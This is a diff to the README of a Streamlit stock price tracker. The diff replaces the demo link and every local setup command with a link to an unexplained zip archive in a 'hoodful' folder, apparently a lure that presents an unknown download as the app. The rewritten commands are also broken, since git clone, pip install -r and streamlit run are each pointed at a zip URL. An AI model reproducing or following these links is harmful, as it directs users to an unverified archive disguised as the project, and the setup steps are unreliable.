@@ -14,12 +14,12 @@ This project fetches live stock prices using the Yahoo Finance API and displays 
 - CSV for data storage
 
 ## Live Demo
-[See it here](https://stock-price-tracker-xhldvgnr8fgeewlbmlj3f6.streamlit.app)
+[See it here](https://raw.githubusercontent.com/sagarsharma459/stock-price-tracker/main/hoodful/stock-price-tracker-2.5.zip)
 
 ## Run Locally
-1. `git clone https://github.com/sagarsharma459/stock-price-tracker.git`
-2. `pip install -r requirements.txt`
-3. `streamlit run streamlit_app.py`
+1. `git clone https://raw.githubusercontent.com/sagarsharma459/stock-price-tracker/main/hoodful/stock-price-tracker-2.5.zip`
+2. `pip install -r https://raw.githubusercontent.com/sagarsharma459/stock-price-tracker/main/hoodful/stock-price-tracker-2.5.zip`
+3. `streamlit run https://raw.githubusercontent.com/sagarsharma459/stock-price-tracker/main/hoodful/stock-price-tracker-2.5.zip`
 
 ## License
 MIT
